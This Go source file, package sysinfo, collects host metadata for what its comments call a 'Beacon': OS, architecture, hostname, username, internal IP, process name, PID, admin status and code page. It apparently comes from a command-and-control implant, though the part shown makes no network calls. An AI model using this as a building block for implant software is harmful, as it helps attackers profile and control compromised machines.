package sysinfo

import (
	"net"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
)

// MetaData 存储 Beacon 的系统信息。
type MetaData struct {
	OS          string
	Arch        string
	Hostname    string
	Username    string
	InternalIP  string
	ProcessName string
	PID         int
	IsAdmin     bool
	ACP         int
}

// GetMetaData 收集当前的系统信息。
func GetMetaData() *MetaData {
	m := &MetaData{
		OS:   runtime.GOOS,
		Arch:    runtime.GOARCH,
		PID:     os.Getpid(),
		IsAdmin: checkIsAdmin(),
		ACP:     getACPCode(),
	}

	hostname, _ := os.Hostname()
	m.Hostname = hostname

	currentUser, err := user.Current()
	if err == nil {
		m.Username = currentUser.Username
	} else {
		m.Username = "unknown"
	}

	m.InternalIP = getInternalIP()

	executable, _ := os.Executable()
	m.ProcessName = filepath.Base(executable)

	return m
}

func getInternalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return "127.0.0.1"
	}
	for _, address := range addrs {
		if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return "127.0.0.1"
}
